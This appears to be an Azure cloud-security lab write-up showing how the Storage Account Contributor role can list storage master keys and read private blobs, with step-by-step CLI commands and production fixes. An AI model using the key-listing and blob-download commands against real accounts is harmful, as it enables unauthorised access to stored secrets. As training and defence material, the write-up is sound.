# Storage Account Keys — Control Plane to Data Plane Bypass

**Difficulty:** Intermediate | **Provider:** Azure | **Category:** Storage / Privilege Escalation

## Scenario

A developer granted an attacker account **Storage Account Contributor** on a storage
account, thinking it was equivalent to a read-only metadata role.

However, `Storage Account Contributor` includes `Microsoft.Storage/storageAccounts/listKeys/action`
— which returns the account's **master keys**. These keys bypass Azure RBAC entirely and
grant full data-plane access, including reading private blobs that no RBAC role was
explicitly assigned for.

This is a common misunderstanding: control-plane roles that include key listing are
effectively equivalent to full storage access.

> **Note — complete this challenge via CLI only.**
> The Azure portal now automatically uses storage account keys when the signed-in user
> has a role that includes `listKeys` (such as `Storage Account Contributor`), so blobs
> appear readable directly in the portal UI. This is a recent change in portal behaviour
> and means the portal effectively exploits the vulnerability for you. To understand the
> attack and learn the technique, follow the CLI steps below.

## Attack Path

```
[Attacker] Azure AD user (Storage Account Contributor)
    |
    v
az storage account keys list  -->  key1 (512-bit shared key)
    |
    v
az storage blob download --account-key <key>  -->  private blob content
    |
    v
credentials.txt  -->  flag
```

### Step 1 — Login as the attacker

```bash
az login --username <attacker_upn> --password <attacker_password>
```

### Step 2 — List account keys

```bash
RESOURCE_GROUP="<resource_group_name>"
STORAGE_ACCOUNT="<storage_account_name>"

KEY=$(az storage account keys list \
  --account-name "${STORAGE_ACCOUNT}" \
  --resource-group "${RESOURCE_GROUP}" \
  --query "[0].value" \
  --output tsv)
```

### Step 3 — Download the private blob

```bash
az storage blob download \
  --account-name "${STORAGE_ACCOUNT}" \
  --account-key "${KEY}" \
  --container-name "internal-secrets" \
  --name "credentials.txt" \
  --file /tmp/flag.txt

cat /tmp/flag.txt
```

## How to Fix in Production

1. **Use `Storage Blob Data Reader` instead of `Storage Account Contributor`** when
   granting read access to blob data — data plane roles do not include key listing.
2. **Disable shared key access** entirely if your workloads use Azure AD authentication:
   ```bash
   az storage account update --name <account> --resource-group <rg> \
     --allow-shared-key-access false
   ```
3. **Audit roles containing `listKeys`** using Azure Policy or a custom query:
   ```bash
   az role definition list --query "[?contains(to_string(permissions[].actions), 'listKeys')].[roleName]" -o tsv
   ```
4. **Monitor key access** via Azure Monitor: alert on `Microsoft.Storage/storageAccounts/listKeys/action`
   events in the Activity Log.

## MITRE ATT&CK Mapping

| Technique | ID |
|---|---|
| Valid Accounts: Cloud Accounts | [T1078.004](https://attack.mitre.org/techniques/T1078/004/) |
| Unsecured Credentials | [T1552](https://attack.mitre.org/techniques/T1552/) |
| Data from Cloud Storage | [T1530](https://attack.mitre.org/techniques/T1530/) |
| Privilege Escalation | [T1548](https://attack.mitre.org/techniques/T1548/) |
